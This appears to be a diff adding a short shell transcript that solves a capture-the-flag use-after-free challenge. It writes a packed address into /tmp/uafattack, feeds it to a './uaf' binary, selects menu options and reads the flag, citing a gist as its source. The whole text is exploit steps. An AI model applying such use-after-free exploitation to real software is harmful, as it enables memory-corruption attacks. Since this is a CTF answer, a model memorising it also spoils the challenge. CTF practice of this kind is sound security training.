@@ -1,0 +1,7 @@
+$ echo -e '\x68\x15\x40\x00\x00\x00\x00\x00' > /tmp/uafattack
+$ ./uaf 24 /tmp/uafattack
+3 2 2 1
+$ cat flag
+
+source:
+https://gist.github.com/ihciah/3c157f18f49bd2287470
